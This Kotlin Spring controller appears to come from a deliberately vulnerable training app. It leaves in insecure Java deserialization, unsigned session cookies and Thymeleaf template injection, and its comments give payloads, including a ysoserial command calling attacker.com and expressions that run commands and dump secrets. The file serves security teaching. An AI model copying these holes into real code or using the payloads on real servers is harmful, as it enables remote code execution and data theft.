package com.kotlingoat.controllers

import com.kotlingoat.models.DeserializeRequest
import com.kotlingoat.models.TemplateRequest
import com.kotlingoat.models.UserSession
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.http.ResponseEntity
import org.springframework.web.bind.annotation.*
import org.thymeleaf.TemplateEngine
import org.thymeleaf.context.Context
import java.io.*
import java.util.Base64

/**
 * VULNERABILITY CATEGORY: Insecure Deserialization & Server-Side Template Injection (SSTI)
 *
 * Vulnerabilities demonstrated:
 *  1. Java object deserialization of untrusted data (RCE via gadget chains)
 *  2. Custom deserialization without integrity check (object tampering)
 *  3. Thymeleaf SSTI via user-controlled template expressions
 *  4. Session object deserialized from cookie without validation
 */
@RestController
@RequestMapping("/api/unsafe")
class DeserializationController {

    @Autowired
    lateinit var templateEngine: TemplateEngine

    // ---------------------------------------------------------------
    // Insecure Deserialization
    // ---------------------------------------------------------------

    /**
     * POST /api/unsafe/deserialize
     *
     * VULNERABILITY (Insecure Java Deserialization - RCE):
     * Accepts a Base64-encoded serialized Java object and deserializes it
     * without any validation. If the classpath contains vulnerable gadget
     * libraries (Commons Collections, Spring, etc.), this leads to RCE.
     *
     * Attack (using ysoserial):
     *   1. Generate payload:
     *      java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/rce" | base64
     *   2. Send payload:
     *      {"payload": "<base64_output>"}
     *   3. Server deserializes the malicious object -> RCE
     *
     * This is CVE-2015-4852 (WebLogic), CVE-2016-4437 (Apache Shiro) style attack.
     */
    @PostMapping("/deserialize")
    fun deserializeObject(@RequestBody request: DeserializeRequest): ResponseEntity<Any> {
        return try {
            val bytes = Base64.getDecoder().decode(request.payload)

            // VULNERABILITY: Deserializing untrusted data without type checking,
            // validation, or use of a safe deserialization library like Jackson.
            // With gadget chains (ysoserial), this achieves Remote Code Execution.
            val ois = ObjectInputStream(ByteArrayInputStream(bytes))
            val obj = ois.readObject()  // DANGER: RCE possible here
            ois.close()

            ResponseEntity.ok(mapOf(
                "deserializedType" to obj::class.java.name,
                "objectString" to obj.toString(),
                // VULNERABILITY: Object details exposed - aids attacker reconnaissance
                "objectFields" to obj::class.java.declaredFields.map { it.name }
            ))
        } catch (e: Exception) {
            // VULNERABILITY: Exception reveals internal class info and stack trace
            ResponseEntity.status(500).body(mapOf(
                "error" to e.message,
                "type" to e::class.java.name,
                "stackTrace" to e.stackTraceToString()
            ))
        }
    }

    /**
     * GET /api/unsafe/session
     *
     * VULNERABILITY (Insecure Deserialization - Session Cookie Tampering):
     * The session is stored as a Base64-encoded serialized Java object in a cookie.
     * An attacker can:
     *  1. Decode the cookie to get the serialized object
     *  2. Modify fields (e.g., role to "admin")
     *  3. Re-serialize and re-encode
     *  4. Send modified cookie -> privilege escalation
     *
     * No HMAC or signature protects the cookie from tampering.
     *
     * Attack flow:
     *  1. Login normally, capture the "session" cookie
     *  2. Base64-decode the cookie
     *  3. Modify UserSession object: role="user" -> role="admin"
     *  4. Re-serialize and Base64-encode
     *  5. Set modified cookie -> access admin endpoints
     */
    @GetMapping("/session")
    fun getSession(
        @CookieValue(value = "session", required = false) sessionCookie: String?
    ): ResponseEntity<Any> {
        if (sessionCookie == null) {
            val session = UserSession(1L, "demo_user", "user", 1L)
            val bos = ByteArrayOutputStream()
            val oos = ObjectOutputStream(bos)
            oos.writeObject(session)
            oos.flush()
            val encoded = Base64.getEncoder().encodeToString(bos.toByteArray())
            return ResponseEntity.ok(mapOf(
                "message" to "No session found. Here is a sample session cookie value.",
                // VULNERABILITY: Session cookie value returned in response body
                "sessionCookieValue" to encoded,
                "hint" to "Decode, modify role='admin', re-serialize, and re-encode the cookie"
            ))
        }

        return try {
            val bytes = Base64.getDecoder().decode(sessionCookie)
            // VULNERABILITY: Deserializes unvalidated, unauthenticated cookie value
            val ois = ObjectInputStream(ByteArrayInputStream(bytes))
            val session = ois.readObject() as UserSession

            ResponseEntity.ok(mapOf(
                "userId" to session.userId,
                "username" to session.username,
                // VULNERABILITY: Role from tampered cookie - no server-side verification
                "role" to session.role,
                "tenantId" to session.tenantId
            ))
        } catch (e: Exception) {
            ResponseEntity.status(400).body(mapOf("error" to "Invalid session: ${e.message}"))
        }
    }

    // ---------------------------------------------------------------
    // Server-Side Template Injection (SSTI)
    // ---------------------------------------------------------------

    /**
     * POST /api/unsafe/render
     *
     * VULNERABILITY (Server-Side Template Injection - SSTI):
     * User-supplied template expressions are processed by the Thymeleaf engine.
     * Thymeleaf SSTI allows reading environment variables, calling Java methods,
     * and in some configurations achieving Remote Code Execution.
     *
     * Attack (Expression Language injection):
     *   {"template": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::"}
     *   -> Executes 'id' command on server
     *
     *   {"template": "__${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream(), T(java.nio.charset.Charset).forName('UTF-8'))}__::"}
     *   -> Reads /etc/passwd via RCE
     *
     *   {"template": "[(${T(java.lang.System).getenv()})]"}
     *   -> Leaks all environment variables (secrets, API keys)
     *
     *   {"template": "[(${T(java.lang.System).getProperty('java.class.path')})]"}
     *   -> Leaks classpath
     */
    @PostMapping("/render")
    fun renderTemplate(@RequestBody request: TemplateRequest): ResponseEntity<Any> {
        return try {
            val context = Context()
            context.setVariable("appName", "KotlinGoat")
            context.setVariable("version", "1.0.0")

            // VULNERABILITY: User-controlled template string processed by Thymeleaf
            // Thymeleaf Spring EL expressions allow Java class invocation -> RCE
            val result = templateEngine.process(request.template, context)

            ResponseEntity.ok(mapOf(
                "rendered" to result,
                "template" to request.template
            ))
        } catch (e: Exception) {
            // VULNERABILITY: Full template error with EL expression details exposed
            ResponseEntity.status(500).body(mapOf(
                "error" to e.message,
                "stackTrace" to e.stackTraceToString()
            ))
        }
    }

    /**
     * GET /api/unsafe/template?name=...
     *
     * VULNERABILITY (SSTI via query parameter):
     * Name parameter injected directly into a Thymeleaf template expression.
     *
     * Attack:
     *   ?name=__${T(java.lang.Runtime).getRuntime().exec('id')}__::
     */
    @GetMapping("/template")
    fun renderInlineTemplate(@RequestParam name: String): ResponseEntity<Any> {
        // VULNERABILITY: User input embedded in template before rendering
        val templateStr = """
            <html>
            <body>
                Hello, [(${name})]! Welcome to KotlinGoat.
            </body>
            </html>
        """.trimIndent()

        return try {
            val context = Context()
            val result = templateEngine.process(templateStr, context)
            ResponseEntity.ok(mapOf("html" to result))
        } catch (e: Exception) {
            ResponseEntity.status(500).body(mapOf("error" to e.message))
        }
    }
}
